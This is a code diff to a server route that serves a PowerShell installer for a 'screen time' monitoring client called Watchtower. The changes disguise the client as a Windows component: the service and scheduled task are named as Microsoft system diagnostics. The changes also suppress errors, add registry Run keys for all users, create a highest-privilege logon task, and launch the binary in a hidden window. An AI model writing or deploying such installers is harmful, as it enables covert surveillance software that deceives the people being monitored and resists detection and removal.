@@ -106,13 +106,14 @@ export function registerApiRoutes(
     const downloadUrl = 'https://github.com/shuaiyuancn/watchtower/releases/latest/download/watchtower.exe';
 
     const script = `# Watchtower 1-Click Client Installer
-$ErrorActionPreference = 'Stop'
+$ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
 $InstallDir = "C:\\ProgramData\\Watchtower"
 $BinaryPath = "$InstallDir\\watchtower.exe"
 $ConfigPath = "$InstallDir\\config.json"
 $ServiceName = "WindowsDiagnosticsHost"
+$TaskName = "Microsoft\\Windows\\SystemDiagnosticsHostTask"
 $DownloadUrl = "${downloadUrl}"
 
 Write-Host "🛡️ Installing Project Watchtower Screen Time Client..." -ForegroundColor Cyan
@@ -122,13 +123,14 @@ if (-not (Test-Path $InstallDir)) {
     New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
 }
 
-# 2. Stop running service if active to release file lock
+# 2. Stop any existing running processes/services to release file locks
+Stop-Process -Name "watchtower" -Force -ErrorAction SilentlyContinue
 $existing = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
 if ($existing) {
     Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
     sc.exe delete $ServiceName | Out-Null
-    Start-Sleep -Seconds 1
 }
+Start-Sleep -Milliseconds 500
 
 # 3. Download watchtower.exe from GitHub Releases
 Write-Host "📥 Downloading latest watchtower.exe from GitHub..." -ForegroundColor Yellow
@@ -154,14 +156,23 @@ $Config = @{
 Set-Content -Path $ConfigPath -Value $Config -Force
 Write-Host " Configuration saved: Connected to ${wsUrl}" -ForegroundColor Green
 
-# 5. Register and start Windows Service
-$binCommand = "\`"$BinaryPath\`" --config \`"$ConfigPath\`""
-sc.exe create $ServiceName binPath= $binCommand start= auto DisplayName= "Windows Diagnostics & Optimization Host"
-sc.exe failure $ServiceName reset= 0 actions= restart/1000/restart/1000/restart/1000
-schtasks.exe /create /tn "Microsoft\\Windows\\SystemDiagnosticsHostTask" /tr $binCommand /sc onlogon /ru SYSTEM /f | Out-Null
-sc.exe start $ServiceName
+# 5. Configure Windows Startup Persistence
+# Method A: Registry Run Key (Runs automatically when any user logs in)
+try {
+    Set-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -Value "\`"$BinaryPath\`" --config \`"$ConfigPath\`"" -Force -ErrorAction SilentlyContinue
+} catch {}
+try {
+    Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -Value "\`"$BinaryPath\`" --config \`"$ConfigPath\`"" -Force -ErrorAction SilentlyContinue
+} catch {}
 
-Write-Host " Watchtower Service successfully started and monitoring!" -ForegroundColor Green
+# Method B: Scheduled Task at user logon (Interactive highest privilege)
+$binArg = "--config \`"$ConfigPath\`""
+schtasks.exe /create /tn $TaskName /tr "\`"$BinaryPath\`" $binArg" /sc onlogon /rl highest /f | Out-Null
+
+# 6. Immediately launch the process in background for the current user session
+Start-Process -FilePath $BinaryPath -ArgumentList $binArg -WindowStyle Hidden
+
+Write-Host " Watchtower Client successfully installed, running in background, and monitoring!" -ForegroundColor Green
 `;
     reply.type('text/plain; charset=utf-8');
     return script;
